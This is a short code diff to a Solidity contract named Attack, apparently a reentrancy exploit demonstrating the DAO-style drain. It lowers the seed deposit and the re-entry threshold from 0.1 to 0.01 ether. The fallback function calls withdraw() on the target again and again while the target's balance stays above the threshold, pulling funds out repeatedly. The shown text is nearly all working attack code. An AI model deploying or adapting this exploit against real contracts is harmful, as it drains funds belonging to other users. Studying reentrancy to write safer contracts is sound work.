@@ -15,7 +15,7 @@ contract Attack{
     }
     function deposit() public payable {
         // Seed the Dao with at least 0.1 Ether.
-        require(msg.value >= 0.1 ether, "Need at least 0.1 ether to commence attack.");
+        require(msg.value >= 0.01 ether, "Need at least 0.01 ether to commence attack.");
         mydao.deposit{value: msg.value}();
     }
     function attack() public {
@@ -24,7 +24,7 @@ contract Attack{
     }
 
     fallback() external payable{
-        if(mydao.daoBalance() >= 0.1 ether){
+        if(mydao.daoBalance() >= 0.01 ether){
             mydao.withdraw();
         }
     }
